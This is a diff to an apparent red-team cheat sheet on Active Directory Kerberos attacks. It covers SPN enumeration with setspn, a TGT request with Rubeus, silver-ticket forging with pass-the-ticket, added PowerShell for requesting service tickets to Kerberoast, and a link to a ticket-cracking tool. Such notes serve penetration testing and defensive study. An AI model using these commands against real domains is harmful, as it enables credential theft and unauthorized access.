@@ -3,7 +3,6 @@
 **CMD.exe**   
 Using cmd.exe: (The following example searches all SPNs in the domain from MSSQL servers)   
 `setspn -Q MSSQLSvc/*`   
-
 Using cmd.exe on a foreign domain: (The following example searches for Hyper-V related SPNs)   
 `setspn -Q *hyper*/* -T <domainname>`   
 Note: setspn command generates alerts from MDI!   
@@ -27,7 +26,11 @@ Requires AD Modules:
 # Kerberos Ticket
 Get krb ticket for user with known password (e.g. via socks proxy):   
 `.\Rubeus.exe asktgt /user:jdoe /password:<CUT> /domain:lab.local /dc:10.0.0.4 /ptt`
-
+Using native Powershell:   
+```Powershell
+PS C:\> Add-Type -AssemblyName System.IdentityModel  
+PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/websrv.domain.local"
+```
 # Kerberos Attacks
 ## Kerberoasting
 ### From Windows
@@ -93,3 +96,7 @@ Use with e.g.:
 .\Rubeus.exe silver /service:MSSQLSvc/server.dumpsterfire.local /rc4:077CCCC23F8ABEEF26A3B70C694A49 /sid:S-1-5-21-875478684-2579768486-654964636 /user:targetuser /domain:dumpsterfire.local /ptt 
 ```
 With `/ptt` the ticket is automatically imported into the local Kerberos cache and can be used to connect to the target service.
+
+# Other stuff
+Change user or groups in Kerberos ticket, Crack requested service tickets:   
+https://github.com/nidem/kerberoast/   
